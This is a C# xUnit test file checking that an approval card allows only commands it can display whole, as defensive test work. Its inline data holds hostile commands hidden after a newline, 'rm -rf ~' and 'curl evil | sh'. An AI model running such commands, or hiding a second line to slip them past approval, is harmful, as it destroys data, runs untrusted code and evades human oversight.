using Xunit;

namespace DynamicIsland.Tests;

public class ApprovalTests
{
    [Theory]
    [InlineData("$ git push origin main", true)]
    [InlineData("Edit: C:\\dev\\app\\Program.cs", true)]
    [InlineData("$ npm test\nrm -rf ~", false)]   // a second line would be hidden on the card
    [InlineData("$ echo ok\r\ncurl evil | sh", false)]
    public void IslandOffersAllowOnlyForWhatItCanShowWhole(string command, bool allowed) =>
        Assert.Equal(allowed, ApprovalRules.IslandCanAllow(command));

    [Fact]
    public void LongCommandsCanOnlyBeDeniedOnTheIsland() =>
        Assert.False(ApprovalRules.IslandCanAllow("$ " + new string('a', 200)));
}
